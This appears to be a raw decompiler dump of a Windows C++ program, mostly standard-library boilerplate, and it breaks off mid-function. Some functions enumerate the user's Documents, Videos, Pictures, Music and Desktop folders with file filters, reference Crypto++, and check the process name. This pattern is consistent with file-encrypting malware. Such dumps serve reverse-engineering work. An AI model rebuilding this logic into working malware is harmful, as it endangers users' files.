_BYTE *__thiscall sub_402A03(void **this, char *a2, _BYTE *Src, _BYTE *a4, int a5)
{
  _BYTE *result; // eax
  char *v7; // edi
  size_t v8; // esi
  int v9; // edx
  int v10; // [esp+Ch] [ebp-1Ch]
  unsigned int v11; // [esp+10h] [ebp-18h]
  char *v12; // [esp+14h] [ebp-14h]
  char *v14; // [esp+24h] [ebp-4h]
  _BYTE *v15; // [esp+38h] [ebp+10h]

  result = *this;
  v7 = (char *)this[1];
  v15 = *this;
  v8 = a4 - Src;
  if ( v8 )
  {
    if ( v8 <= (_BYTE *)this[2] - v7 )
    {
      if ( v8 >= v7 - a2 )
      {
        memmove(&a2[v8], a2, v7 - a2);
        this[1] = &v7[v8];
        return memmove(a2, Src, v8);
      }
      else
      {
        memmove(v7, &v7[-v8], v8);
        this[1] = &v7[v8];
        memmove(&a2[v8], a2, v7 - a2 - v8);
        return memmove(a2, Src, v8);
      }
    }
    else
    {
      v9 = v7 - v15;
      if ( v8 > 0x7FFFFFFF - (v7 - v15) )
        sub_402682(this, v9);
      v10 = v9 + v8;
      v11 = sub_40292E(this, v9 + v8);
      v14 = (char *)std::_Allocate<8,std::_Default_allocate_traits,0>(v11);
      v12 = &v14[a2 - v15];
      memmove(v12, Src, v8);
      if ( v8 == 1 && a2 == v7 )
      {
        memmove(v14, v15, v7 - v15);
      }
      else
      {
        memmove(v14, v15, a2 - v15);
        memmove(&v12[v8], a2, v7 - a2);
      }
      return (_BYTE *)sub_4028FA((int)this, (int)v14, v10, v11);
    }
  }
  return result;
}
// 402682: using guessed type void __fastcall __noreturn sub_402682(_DWORD, _DWORD);

//----- (00402B37) --------------------------------------------------------
unsigned int __fastcall sub_402B37(int *a1, int a2, unsigned int a3)
{
  unsigned int v4; // edi
  int v5; // eax
  unsigned int result; // eax

  if ( a3 > 0x7FFFFFFF )
    sub_402682(a1, a2);
  v4 = sub_40292E(a1, a3);
  if ( *a1 )
  {
    std::_Deallocate<8,0>((void *)*a1, a1[2] - *a1);
    *a1 = 0;
    a1[1] = 0;
    a1[2] = 0;
  }
  v5 = std::_Allocate<8,std::_Default_allocate_traits,0>(v4);
  *a1 = v5;
  a1[1] = v5;
  result = v4 + v5;
  a1[2] = result;
  return result;
}
// 402682: using guessed type void __fastcall __noreturn sub_402682(_DWORD, _DWORD);

//----- (00402BC1) --------------------------------------------------------
_DWORD *__thiscall sub_402BC1(_DWORD *this)
{
  _DWORD *result; // eax

  this[1] = 0;
  result = this;
  this[2] = 0;
  this[1] = "bad cast";
  *this = &std::bad_cast::`vftable';
  return result;
}
// 46C9D4: using guessed type void *std::bad_cast::`vftable';

//----- (00402BD9) --------------------------------------------------------
void __noreturn sub_402BD9()
{
  _DWORD pExceptionObject[3]; // [esp+0h] [ebp-Ch] BYREF

  sub_402BC1(pExceptionObject);
  _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVbad_cast_std__);
}
// 402BD9: using guessed type void __noreturn sub_402BD9();
// 402BD9: using guessed type _DWORD pExceptionObject[3];

//----- (00402BF6) --------------------------------------------------------
std::exception *__thiscall sub_402BF6(std::exception *this, struct std::exception *a2)
{
  std::exception::exception(this, a2);
  *(_DWORD *)this = &std::bad_cast::`vftable';
  return this;
}
// 46C9D4: using guessed type void *std::bad_cast::`vftable';

//----- (00402C32) --------------------------------------------------------
int __thiscall sub_402C32(_Thrd_t *this)
{
  int v2; // eax
  int result; // eax

  if ( !this->_Id )
    std::_Throw_Cpp_error(1);
  v2 = _Thrd_detach(*this);
  result = std::_Check_C_return(v2);
  this->_Hnd = 0;
  this->_Id = 0;
  return result;
}

//----- (00402C5F) --------------------------------------------------------
void *sub_402C5F()
{
  BOOL v0; // eax
  bool v1; // bl

  v0 = TryEnterCriticalSection(&CriticalSection);
  v1 = v0;
  if ( v0 )
    EnterCriticalSection(&CriticalSection);
  if ( dword_493184 > *(_DWORD *)(*(_DWORD *)NtCurrentTeb()->ThreadLocalStoragePointer + 4) )
  {
    _Init_thread_header(&dword_493184);
    if ( dword_493184 == -1 )
    {
      atexit(nullsub_1);
      _Init_thread_footer(&dword_493184);
    }
  }
  if ( v1 )
    LeaveCriticalSection(&CriticalSection);
  return &unk_493168;
}
// 42D09E: using guessed type _DWORD __cdecl _Init_thread_footer(_DWORD);
// 42D0E8: using guessed type _DWORD __cdecl _Init_thread_header(_DWORD);
// 493184: using guessed type int dword_493184;

//----- (00402CCE) --------------------------------------------------------
char __thiscall sub_402CCE(_BYTE *this)
{
  return this[4];
}

//----- (00402CD2) --------------------------------------------------------
char __thiscall sub_402CD2(_BYTE *this, char a2)
{
  char result; // al

  result = a2;
  this[4] = a2;
  return result;
}

//----- (00402D02) --------------------------------------------------------
int __thiscall sub_402D02(_DWORD *this)
{
  int result; // eax

  *this = &FilterFile::`vftable';
  sub_401CF5(this + 5);
  result = sub_401CF5(this + 2);
  *this = &FileUtil::IFilter::`vftable';
  return result;
}
// 47EA18: using guessed type void *FilterFile::`vftable';
// 47EA58: using guessed type void *FileUtil::IFilter::`vftable';

//----- (00402D23) --------------------------------------------------------
_DWORD *__thiscall sub_402D23(_DWORD *Block, char a2)
{
  sub_402D02(Block);
  if ( (a2 & 1) != 0 )
    sub_42CF7C(Block);
  return Block;
}

//----- (00402D5E) --------------------------------------------------------
_DWORD *__thiscall sub_402D5E(_DWORD *Block, char a2)
{
  *Block = &FilterDir::`vftable';
  sub_401CF5(Block + 2);
  *Block = &FileUtil::IFilter::`vftable';
  if ( (a2 & 1) != 0 )
    sub_42CF7C(Block);
  return Block;
}
// 47EA58: using guessed type void *FileUtil::IFilter::`vftable';
// 47EA78: using guessed type void *FilterDir::`vftable';

//----- (00402D96) --------------------------------------------------------
_DWORD *__thiscall sub_402D96(_DWORD *Block, char a2)
{
  *Block = &FileUtil::IFilter::`vftable';
  if ( (a2 & 1) != 0 )
    sub_42CF7C(Block);
  return Block;
}
// 47EA58: using guessed type void *FileUtil::IFilter::`vftable';

//----- (00402DB9) --------------------------------------------------------
int __thiscall sub_402DB9(_DWORD *this)
{
  unknown_libname_3(this + 48);
  sub_401B42((int)(this + 45));
  sub_401B42((int)(this + 42));
  sub_401B42((int)(this + 39));
  sub_401B42((int)(this + 36));
  this[21] = &FilterDir::`vftable';
  this[26] = &FileUtil::IFilter::`vftable';
  sub_401CF5(this + 23);
  this[21] = &FileUtil::IFilter::`vftable';
  sub_402D02(this + 13);
  unknown_libname_3(this + 3);
  return sub_401CF5(this);
}
// 401D49: using guessed type int __thiscall unknown_libname_3(_DWORD);
// 47EA58: using guessed type void *FileUtil::IFilter::`vftable';
// 47EA78: using guessed type void *FilterDir::`vftable';

//----- (00402E27) --------------------------------------------------------
std::exception *__thiscall sub_402E27(std::exception *this, char *a2)
{
  const char *v2; // eax

  v2 = a2;
  if ( *((_DWORD *)a2 + 5) >= 0x10u )
    v2 = *(const char **)a2;
  std::exception::exception(this, v2);
  *(_DWORD *)this = &std::runtime_error::`vftable';
  return this;
}
// 46C9C8: using guessed type void *std::runtime_error::`vftable';

//----- (00402E4B) --------------------------------------------------------
std::exception *__thiscall sub_402E4B(std::exception *this, struct std::exception *a2)
{
  std::exception::exception(this, a2);
  *(_DWORD *)this = &std::runtime_error::`vftable';
  return this;
}
// 46C9C8: using guessed type void *std::runtime_error::`vftable';

//----- (00402E9F) --------------------------------------------------------
int __thiscall sub_402E9F(void *this, int a2, int a3)
{
  int v3; // eax
  char v5[8]; // [esp+0h] [ebp-8h] BYREF

  v3 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 12))(this);
  return std::operator==(v3, v5);
}
// 402E66: using guessed type _DWORD __cdecl std::operator==(_DWORD, _DWORD);
// 402E9F: using guessed type char var_8[8];

//----- (00402EFA) --------------------------------------------------------
int __cdecl sub_402EFA(int a1, int a2, int a3, void *Src, int a5, int a6, int a7, int a8)
{
  void **v8; // eax
  void *v10[6]; // [esp+0h] [ebp-24h] BYREF
  int v11; // [esp+20h] [ebp-4h]

  v11 = 0;
  if ( a8 )
    sub_40559D(&Src, ": ", 2u);
  (*(void (__thiscall **)(int, void **, int))(*(_DWORD *)a3 + 8))(a3, v10, a2);
  LOBYTE(v11) = 1;
  v8 = v10;
  if ( v10[5] >= (void *)0x10 )
    v8 = (void **)v10[0];
  sub_40559D(&Src, v8, (size_t)v10[4]);
  unknown_libname_5(v10);
  std::string::string(&Src);
  unknown_libname_5(&Src);
  return a1;
}
// 401F74: using guessed type int __thiscall unknown_libname_5(_DWORD);
// 404F75: using guessed type _DWORD __stdcall std::string::string(_DWORD);

//----- (00402F75) --------------------------------------------------------
std::exception *__thiscall sub_402F75(std::exception *this, int a2, int a3, _DWORD *Src)
{
  char *v5; // eax
  std::exception *result; // eax
  void *v7[4]; // [esp-18h] [ebp-3Ch] BYREF
  int v8; // [esp-8h] [ebp-2Ch]
  int v9; // [esp-4h] [ebp-28h]
  int v10[8]; // [esp+4h] [ebp-20h] BYREF

  v10[6] = (int)this;
  v8 = 0;
  v9 = 0;
  sub_4055F6(v7, Src);
  v5 = (char *)sub_402EFA((int)v10, a2, a3, v7[0], (int)v7[1], (int)v7[2], (int)v7[3], v8);
  sub_402E27(this, v5);
  unknown_libname_5(v10);
  *((_DWORD *)this + 3) = a2;
  *((_DWORD *)this + 4) = a3;
  result = this;
  *(_DWORD *)this = &std::_System_error::`vftable';
  return result;
}
// 401F74: using guessed type int __thiscall unknown_libname_5(_DWORD);
// 46CA20: using guessed type void *std::_System_error::`vftable';

//----- (00402FFF) --------------------------------------------------------
std::exception *__thiscall sub_402FFF(std::exception *this, int a2, int a3, void *Src)
{
  std::exception *result; // eax
  _DWORD v6[10]; // [esp+4h] [ebp-28h] BYREF

  v6[4] = 0;
  v6[5] = 15;
  v6[6] = this;
  LOBYTE(v6[0]) = 0;
  unknown_libname_15(Src);
  v6[9] = 0;
  sub_402F75(this, a2, a3, v6);
  unknown_libname_5(v6);
  result = this;
  *(_DWORD *)this = &std::system_error::`vftable';
  return result;
}
// 401F74: using guessed type int __thiscall unknown_libname_5(_DWORD);
// 46CA2C: using guessed type void *std::system_error::`vftable';

//----- (00403060) --------------------------------------------------------
std::exception *__thiscall sub_403060(std::exception *this, struct std::exception *a2)
{
  sub_40307B(this, a2);
  *(_DWORD *)this = &std::system_error::`vftable';
  return this;
}
// 46CA2C: using guessed type void *std::system_error::`vftable';

//----- (0040307B) --------------------------------------------------------
std::exception *__thiscall sub_40307B(std::exception *this, struct std::exception *a2)
{
  std::exception::exception(this, a2);
  *(_DWORD *)this = &std::_System_error::`vftable';
  *((_DWORD *)this + 3) = *((_DWORD *)a2 + 3);
  *((_DWORD *)this + 4) = *((_DWORD *)a2 + 4);
  return this;
}
// 46CA20: using guessed type void *std::_System_error::`vftable';

//----- (004030A5) --------------------------------------------------------
const char *sub_4030A5()
{
  return "generic";
}

//----- (004030E4) --------------------------------------------------------
const char *sub_4030E4()
{
  return "iostream";
}

//----- (004030EA) --------------------------------------------------------
_DWORD *__stdcall sub_4030EA(_DWORD *a1, int a2)
{
  char *v3; // eax

  if ( a2 == 1 )
  {
    a1[4] = 0;
    a1[5] = 15;
    *(_BYTE *)a1 = 0;
    unknown_libname_15("iostream stream error");
  }
  else
  {
    v3 = (char *)std::_Syserror_map(a2);
    sub_404FA6(a1, v3);
  }
  return a1;
}

//----- (0040312F) --------------------------------------------------------
_DWORD *__thiscall sub_40312F(_DWORD *Block, char a2)
{
  *Block = &std::_Facet_base::`vftable';
  if ( (a2 & 1) != 0 )
    sub_42CF7C(Block);
  return Block;
}
// 46C9E0: using guessed type void *std::_Facet_base::`vftable';

//----- (00403152) --------------------------------------------------------
int __thiscall sub_403152(int this, char *Locale)
{
  std::_Lockit::_Lockit((std::_Lockit *)this, 0);
  *(_DWORD *)(this + 4) = 0;
  *(_BYTE *)(this + 8) = 0;
  *(_DWORD *)(this + 12) = 0;
  *(_BYTE *)(this + 16) = 0;
  *(_DWORD *)(this + 20) = 0;
  *(_WORD *)(this + 24) = 0;
  *(_DWORD *)(this + 28) = 0;
  *(_WORD *)(this + 32) = 0;
  *(_DWORD *)(this + 36) = 0;
  *(_BYTE *)(this + 40) = 0;
  *(_DWORD *)(this + 44) = 0;
  *(_BYTE *)(this + 48) = 0;
  if ( !Locale )
    sub_429750("bad locale name");
  std::_Locinfo::_Locinfo_ctor((struct std::_Locinfo *)this, Locale);
  return this;
}

//----- (004031C8) --------------------------------------------------------
void __thiscall sub_4031C8(std::_Lockit *this)
{
  std::_Locinfo::_Locinfo_dtor(this);
  if ( *((_DWORD *)this + 11) )
    j___free_base(*((void **)this + 11));
  *((_DWORD *)this + 11) = 0;
  if ( *((_DWORD *)this + 9) )
    j___free_base(*((void **)this + 9));
  *((_DWORD *)this + 9) = 0;
  if ( *((_DWORD *)this + 7) )
    j___free_base(*((void **)this + 7));
  *((_DWORD *)this + 7) = 0;
  if ( *((_DWORD *)this + 5) )
    j___free_base(*((void **)this + 5));
  *((_DWORD *)this + 5) = 0;
  if ( *((_DWORD *)this + 3) )
    j___free_base(*((void **)this + 3));
  *((_DWORD *)this + 3) = 0;
  if ( *((_DWORD *)this + 1) )
    j___free_base(*((void **)this + 1));
  *((_DWORD *)this + 1) = 0;
  std::_Lockit::~_Lockit(this);
}

//----- (0040329E) --------------------------------------------------------
void __thiscall sub_40329E(volatile signed __int32 *this)
{
  _InterlockedIncrement(this + 1);
}

//----- (004032A3) --------------------------------------------------------
volatile signed __int32 *__thiscall sub_4032A3(volatile signed __int32 *this)
{
  volatile signed __int32 *result; // eax

  result = 0;
  if ( !_InterlockedExchangeAdd(this + 1, 0xFFFFFFFF) )
    return this;
  return result;
}

//----- (004032B2) --------------------------------------------------------
void __thiscall sub_4032B2(_DWORD *this)
{
  int v1; // ecx
  void (__thiscall ***v2)(_DWORD, int); // eax

  v1 = this[1];
  if ( v1 )
  {
    v2 = (void (__thiscall ***)(_DWORD, int))(*(int (__thiscall **)(int))(*(_DWORD *)v1 + 8))(v1);
    if ( v2 )
      (**v2)(v2, 1);
  }
}

//----- (0040331F) --------------------------------------------------------
int __thiscall sub_40331F(void *this)
{
  return (*(int (__thiscall **)(void *))(*(_DWORD *)this + 12))(this);
}

//----- (00403324) --------------------------------------------------------
int sub_403324()
{
  return 1;
}

//----- (00403328) --------------------------------------------------------
_DWORD *__thiscall sub_403328(_DWORD *this, int a2, int a3)
{
  _Ctypevec *v4; // esi
  _DWORD *result; // eax
  _Ctypevec v6; // [esp+Ch] [ebp-10h] BYREF

  this[1] = a3;
  *this = &std::ctype<char>::`vftable';
  v4 = _Getctype(&v6);
  result = this;
  this[2] = v4->_Page;
  v4 = (_Ctypevec *)((char *)v4 + 4);
  this[3] = v4->_Page;
  v4 = (_Ctypevec *)((char *)v4 + 4);
  this[4] = v4->_Page;
  this[5] = v4->_Table;
  return result;
}
// 46C9F0: using guessed type void *std::ctype<char>::`vftable';

//----- (0040335B) --------------------------------------------------------
int __cdecl sub_40335B(_DWORD *Block, std::locale *a2)
{
  char *v3; // eax
  int v4; // eax
  char v6[52]; // [esp+4h] [ebp-40h] BYREF
  int v7; // [esp+40h] [ebp-4h]
  _DWORD *Blocka; // [esp+4Ch] [ebp+8h]

  if ( Block && !*Block )
  {
    Blocka = operator new(0x18u);
    v7 = 0;
    v3 = (char *)std::locale::c_str(a2);
    v4 = sub_403152((int)v6, v3);
    *Block = sub_403328(Blocka, v4, 0);
    sub_4031C8((std::_Lockit *)v6);
  }
  return 2;
}

//----- (004034BF) --------------------------------------------------------
_DWORD *__thiscall sub_4034BF(_DWORD *Block, char a2)
{
  *Block = &std::ctype<char>::`vftable';
  std::ctype<char>::_Tidy();
  *Block = &std::_Facet_base::`vftable';
  if ( (a2 & 1) != 0 )
    sub_42CF7C(Block);
  return Block;
}
// 4033BD: using guessed type int std::ctype<char>::_Tidy(void);
// 46C9E0: using guessed type void *std::_Facet_base::`vftable';
// 46C9F0: using guessed type void *std::ctype<char>::`vftable';

//----- (004034ED) --------------------------------------------------------
int __cdecl sub_4034ED(_DWORD *Block, std::locale *a2)
{
  char *v3; // eax
  int v4; // eax
  char v6[52]; // [esp+4h] [ebp-40h] BYREF
  int v7; // [esp+40h] [ebp-4h]
  _DWORD *Blocka; // [esp+4Ch] [ebp+8h]

  if ( Block && !*Block )
  {
    Blocka = operator new(0x44u);
    v7 = 0;
    v3 = (char *)std::locale::c_str(a2);
    v4 = sub_403152((int)v6, v3);
    Blocka[1] = 0;
    *Blocka = &std::ctype<wchar_t>::`vftable';
    std::ctype<wchar_t>::_Init(v4);
    *Block = Blocka;
    sub_4031C8((std::_Lockit *)v6);
  }
  return 2;
}
// 403580: using guessed type _DWORD __stdcall std::ctype<wchar_t>::_Init(_DWORD);
// 46ED2C: using guessed type void *std::ctype<wchar_t>::`vftable';

//----- (004035F1) --------------------------------------------------------
unsigned __int16 *__thiscall sub_4035F1(void *this, int a2, unsigned __int16 *a3, unsigned __int16 *a4)
{
  while ( a3 != a4 && !(*(unsigned __int8 (__thiscall **)(void *, int, _DWORD))(*(_DWORD *)this + 16))(this, a2, *a3) )
    ++a3;
  return a3;
}

//----- (0040361F) --------------------------------------------------------
unsigned __int16 *__thiscall sub_40361F(void *this, int a2, unsigned __int16 *a3, unsigned __int16 *a4)
{
  while ( a3 != a4 && (*(unsigned __int8 (__thiscall **)(void *, int, _DWORD))(*(_DWORD *)this + 16))(this, a2, *a3) )
    ++a3;
  return a3;
}

//----- (004036D5) --------------------------------------------------------
__int16 __thiscall sub_4036D5(int this, char a2)
{
  int v2; // eax
  wchar_t v3; // cx
  mbstate_t v5; // [esp+0h] [ebp-Ch] BYREF
  wchar_t v6; // [esp+8h] [ebp-4h] BYREF

  v5 = 0i64;
  v2 = _Mbrtowc(&v6, &a2, 1u, &v5, (const _Cvtvec *)(this + 24));
  v3 = v6;
  if ( v2 < 0 )
    return -1;
  return v3;
}

//----- (00403712) --------------------------------------------------------
__int16 __thiscall sub_403712(int this, char a2)
{
  return sub_4036D5(this, a2);
}

//----- (0040374E) --------------------------------------------------------
char __thiscall sub_40374E(int this, wchar_t a2, char a3)
{
  int v3; // eax
  char v4; // dl
  mbstate_t v6; // [esp+0h] [ebp-10h] BYREF
  char v7[8]; // [esp+8h] [ebp-8h] BYREF

  v6 = 0i64;
  v3 = _Wcrtomb(v7, a2, &v6, (const _Cvtvec *)(this + 24));
  v4 = v7[0];
  if ( v3 != 1 )
    return a3;
  return v4;
}
// 40374E: using guessed type char var_8[8];

//----- (00403787) --------------------------------------------------------
char __thiscall sub_403787(int this, wchar_t a2, char a3)
{
  return sub_40374E(this, a2, a3);
}

//----- (004037E7) --------------------------------------------------------
std::exception *__thiscall sub_4037E7(std::exception *this, void *Src, int *a3)
{
  sub_402FFF(this, *a3, a3[1], Src);
  *(_DWORD *)this = &std::ios_base::failure::`vftable';
  return this;
}
// 46CA70: using guessed type void *std::ios_base::failure::`vftable';

//----- (00403814) --------------------------------------------------------
int __thiscall sub_403814(_DWORD *this, char a2, char a3)
{
  int result; // eax
  int v4; // ecx
  char *v5; // esi
  int *error_code; // eax
  char v7[20]; // [esp+4h] [ebp-1Ch] BYREF
  char v8[8]; // [esp+18h] [ebp-8h] BYREF

  result = a2 & 0x17;
  this[3] = result;
  v4 = result & this[4];
  if ( v4 )
  {
    if ( !a3 )
    {
      if ( (v4 & 4) != 0 )
      {
        v5 = "ios_base::badbit set";
      }
      else
      {
        v5 = "ios_base::failbit set";
        if ( (v4 & 2) == 0 )
          v5 = "ios_base::eofbit set";
      }
      error_code = (int *)std::make_error_code(v8, 1);
      sub_4037E7((std::exception *)v7, v5, error_code);
      _CxxThrowException(v7, (_ThrowInfo *)&_TI5_AVfailure_ios_base_std__);
    }
    _CxxThrowException(0, 0);
  }
  return result;
}
// 402EE3: using guessed type int __cdecl std::make_error_code(_DWORD, _DWORD);
// 48A8F8: using guessed type __TI_flags _TI5_AVfailure_ios_base_std__;
// 403814: using guessed type char var_8[8];

//----- (0040387E) --------------------------------------------------------
struct std::locale::_Locimp *__thiscall sub_40387E(_DWORD *this)
{
  _DWORD *v2; // esi
  struct std::locale::_Locimp *result; // eax

  this[12] = 0;
  this[2] = 0;
  this[4] = 0;
  this[5] = 513;
  this[6] = 6;
  this[7] = 0;
  this[8] = 0;
  this[9] = 0;
  this[10] = 0;
  this[11] = 0;
  sub_403814(this, 0, 0);
  v2 = operator new(8u);
  result = std::locale::_Init(1);
  v2[1] = result;
  this[12] = v2;
  return result;
}

//----- (004038E6) --------------------------------------------------------
std::exception *__thiscall sub_4038E6(std::exception *this, struct std::exception *a2)
{
  sub_40307B(this, a2);
  *(_DWORD *)this = &std::ios_base::failure::`vftable';
  return this;
}
// 46CA70: using guessed type void *std::ios_base::failure::`vftable';

//----- (00403901) --------------------------------------------------------
struct std::ios_base *__thiscall sub_403901(struct std::ios_base *this, char a2)
{
  *(_DWORD *)this = &std::ios_base::`vftable';
  std::ios_base::_Ios_base_dtor(this);
  if ( (a2 & 1) != 0 )
    sub_42CF7C(this);
  return this;
}
// 46EC10: using guessed type void *std::ios_base::`vftable';

//----- (00403955) --------------------------------------------------------
_DWORD *__thiscall sub_403955(_DWORD *Block, char a2)
{
  *Block = &CryptoPP::NameValuePairs::`vftable';
  if ( (a2 & 1) != 0 )
    sub_42CF7C(Block);
  return Block;
}
// 46B434: using guessed type void *CryptoPP::NameValuePairs::`vftable';

//----- (00403978) --------------------------------------------------------
char __stdcall sub_403978(int a1, int a2, int a3)
{
  return 0;
}

//----- (004039B7) --------------------------------------------------------
int __usercall sub_4039B7@<eax>(int a1@<ebx>, void **Src, int a3, int a4, int a5, int a6, unsigned int a7)
{
  int v7; // eax
  int v8; // esi
  int v9; // eax
  void **p_Src; // eax
  int v11; // eax
  int v12; // eax
  void *v14; // [esp-4h] [ebp-F8h]
  _DWORD v15[54]; // [esp+8h] [ebp-ECh] BYREF
  int v16; // [esp+E0h] [ebp-14h] BYREF
  char v17; // [esp+E4h] [ebp-10h]
  int v18; // [esp+F0h] [ebp-4h]

  v18 = 0;
  v7 = _Mtx_lock((_Mtx_t)&unk_493138);
  std::_Check_C_return(v7);
  v8 = dword_493124 + 1;
  v17 = 1;
  dword_493124 = v8;
  v16 = v8;
  sub_404D52(v14, &v16);
  v9 = _Mtx_unlock((_Mtx_t)&unk_493138);
  std::_Check_C_return(v9);
  sub_407355((int)v15);
  LOBYTE(v18) = 1;
  sub_4075CF((int)v15, a1, (int)&unk_493138, v8);
  p_Src = (void **)&Src;
  if ( a7 >= 8 )
    p_Src = Src;
  sub_40782F((int)v15, p_Src);
  v11 = _Mtx_lock((_Mtx_t)&unk_493138);
  std::_Check_C_return(v11);
  *((char *)::Src + 8 * v8 - 4) = 0;
  v12 = _Mtx_unlock((_Mtx_t)&unk_493138);
  std::_Check_C_return(v12);
  sub_402DB9(v15);
  return unknown_libname_3(&Src);
}
// 4039F8: variable 'v14' is possibly undefined
// 401D49: using guessed type int __thiscall unknown_libname_3(_DWORD);
// 493124: using guessed type int dword_493124;
// 4039B7: using guessed type _DWORD var_EC[54];

//----- (00403A82) --------------------------------------------------------
int __usercall sub_403A82@<eax>(int a1@<esi>)
{
  int v1; // eax
  int v2; // edi
  int v3; // eax
  unsigned int i; // esi
  void **v5; // eax
  void **v6; // eax
  void **v7; // eax
  int v8; // eax
  int v9; // eax
  void *v11; // [esp-4h] [ebp-14Ch]
  _DWORD v12[10]; // [esp+Ch] [ebp-13Ch] BYREF
  int v13; // [esp+34h] [ebp-114h]
  char v14[24]; // [esp+E4h] [ebp-64h] BYREF
  void *Src[6]; // [esp+FCh] [ebp-4Ch] BYREF
  void *v16[5]; // [esp+114h] [ebp-34h] BYREF
  unsigned int v17; // [esp+128h] [ebp-20h]
  void *v18[2]; // [esp+12Ch] [ebp-1Ch]
  const wchar_t *v19; // [esp+134h] [ebp-14h] BYREF
  const wchar_t *v20; // [esp+138h] [ebp-10h]
  int v21; // [esp+144h] [ebp-4h]

  v1 = _Mtx_lock((_Mtx_t)&unk_493138);
  std::_Check_C_return(v1);
  v2 = dword_493124 + 1;
  LOBYTE(v20) = 1;
  dword_493124 = v2;
  v19 = (const wchar_t *)v2;
  sub_404D52(v11, &v19);
  v3 = _Mtx_unlock((_Mtx_t)&unk_493138);
  std::_Check_C_return(v3);
  Src[5] = (void *)7;
  Src[4] = 0;
  LOWORD(Src[0]) = 0;
  v21 = 0;
  sub_40A3CD(L"USERPROFILE", (WCHAR *)Src);
  sub_407355((int)v12);
  LOBYTE(v21) = 1;
  sub_4075CF((int)v12, 0, v2, a1);
  if ( v13 )
    (*(void (__thiscall **)(int, _DWORD))(*(_DWORD *)v13 + 8))(v13, 0);
  v18[0] = L"\\Documents";
  v18[1] = L"\\Videos";
  v19 = L"\\Pictures";
  v20 = L"\\Music";
  v16[4] = 0;
  v17 = 0;
  sub_401EE0(v16, Src);
  LOBYTE(v21) = 2;
  for ( i = 0; i < 4; ++i )
  {
    sub_401C17(v16, v18[i]);
    v5 = v16;
    if ( v17 >= 8 )
      v5 = (void **)v16[0];
    sub_40782F((int)v12, v5);
  }
  v6 = (void **)sub_405A3F((int)v14, Src, (char *)L"\\Desktop");
  if ( v16 != v6 )
  {
    LOBYTE(v20) = 0;
    std::wstring::_Move_assign(v6, v20);
  }
  unknown_libname_3(v14);
  v7 = v16;
  if ( v17 >= 8 )
    v7 = (void **)v16[0];
  sub_40782F((int)v12, v7);
  v8 = _Mtx_lock((_Mtx_t)&unk_493138);
  std::_Check_C_return(v8);
  *((char *)::Src + 8 * v2 - 4) = 0;
  v9 = _Mtx_unlock((_Mtx_t)&unk_493138);
  std::_Check_C_return(v9);
  unknown_libname_3(v16);
  sub_402DB9(v12);
  return unknown_libname_3(Src);
}
// 403AC0: variable 'v11' is possibly undefined
// 401D49: using guessed type int __thiscall unknown_libname_3(_DWORD);
// 401F48: using guessed type _DWORD __stdcall std::wstring::_Move_assign(_DWORD, _DWORD);
// 47EB44: using guessed type wchar_t aDocuments[11];
// 47EB5C: using guessed type wchar_t aVideos[8];
// 47EB6C: using guessed type wchar_t aPictures[10];
// 47EB80: using guessed type wchar_t aMusic[7];
// 47EB90: using guessed type wchar_t aDesktop[9];
// 493124: using guessed type int dword_493124;
// 403A82: using guessed type _DWORD var_13C[10];

//----- (00403C12) --------------------------------------------------------
int sub_403C12()
{
  HANDLE CurrentProcess; // eax
  const CHAR *v1; // eax
  LPCSTR lpString1[5]; // [esp+8h] [ebp-24h] BYREF
  unsigned int v4; // [esp+1Ch] [ebp-10h]
  int v5; // [esp+28h] [ebp-4h]

  v4 = 15;
  lpString1[4] = 0;
  LOBYTE(lpString1[0]) = 0;
  v5 = 0;
  std::string::resize(260, 0);
  CurrentProcess = GetCurrentProcess();
  GetModuleBaseNameA(CurrentProcess, 0, lpString1, 260);
  sub_402C5F();
  v1 = (const CHAR *)lpString1;
  if ( v4 >= 0x10 )
    v1 = lpString1[0];
  if ( lstrcmpA(v1, "mhtop32bit.exe") )
    sub_403F9D();
  unknown_libname_5(lpString1);
  return 0;
}
// 403C4A: conditional instruction was optimized away because %var_10.4==F
// 401F74: using guessed type int __thiscall unknown_libname_5(_DWORD);
// 46B268: using guessed type int __stdcall GetModuleBaseNameA(_DWORD, _DWORD, _DWORD, _DWORD);

//----- (00403C9A) --------------------------------------------------------
int __usercall sub_403C9A@<eax>(int a1@<edi>, int a2@<esi>)
{
  int v2; // ecx
  int v3; // eax
  void **v4; // eax
  LPWSTR *v5; // eax
  _DWORD v7[22]; // [esp+4h] [ebp-118h] BYREF
  char v8; // [esp+5Ch] [ebp-C0h]
  void *v9[6]; // [esp+DCh] [ebp-40h] BYREF
  int v10; // [esp+F4h] [ebp-28h]
  LPWSTR lpFilename[5]; // [esp+F8h] [ebp-24h] BYREF
  unsigned int v12; // [esp+10Ch] [ebp-10h]
  int v13; // [esp+118h] [ebp-4h]

  v12 = 7;
  lpFilename[4] = 0;
  LOWORD(lpFilename[0]) = 0;
  v13 = 0;
  std::wstring::resize(300, 0);
  if ( GetModuleFileNameW(0, (LPWSTR)lpFilename, 0) )
  {
    sub_407355((int)v7);
    LOBYTE(v13) = 1;
    sub_4075CF((int)v7, 0, a1, a2);
    v3 = sub_404EAD(lpFilename, v2, v2);
    if ( v3 != -1 )
    {
      v4 = sub_401B9B(lpFilename, v9, 0, v3);
      if ( lpFilename != (LPWSTR *)v4 )
      {
        LOBYTE(v10) = 0;
        std::wstring::_Move_assign(v4, v10);
      }
      unknown_libname_3(v9);
      v5 = lpFilename;
      v8 = 0;
      if ( v12 >= 8 )
        v5 = (LPWSTR *)lpFilename[0];
      sub_40782F((int)v7, v5);
    }
    sub_402DB9(v7);
  }
  return unknown_libname_3(lpFilename);
}
// 403CD8: conditional instruction was optimized away because %var_10.4==7
// 403D07: variable 'v2' is possibly undefined
// 401D49: using guessed type int __thiscall unknown_libname_3(_DWORD);
// 401F48: using guessed type _DWORD __stdcall std::wstring::_Move_assign(_DWORD, _DWORD);
// 403C9A: using guessed type _DWORD var_118[22];

//----- (00403D77) --------------------------------------------------------
int __usercall sub_403D77@<eax>(int a1@<edi>, int a2@<esi>)
{
  HANDLE CurrentProcess; // eax
  const CHAR *v3; // eax
  LPCSTR lpString1[5]; // [esp+8h] [ebp-24h] BYREF
  unsigned int v6; // [esp+1Ch] [ebp-10h]
  int v7; // [esp+28h] [ebp-4h]

  sub_401841();
  CreateThread(0, 0, (LPTHREAD_START_ROUTINE)StartAddress, 0, 0, 0);
  sub_403C12();
  sub_403C9A(a1, a2);
  lpString1[4] = 0;
  v6 = 15;
  LOBYTE(lpString1[0]) = 0;
  v7 = 0;
  std::string::resize(260, 0);
  CurrentProcess = GetCurrentProcess();
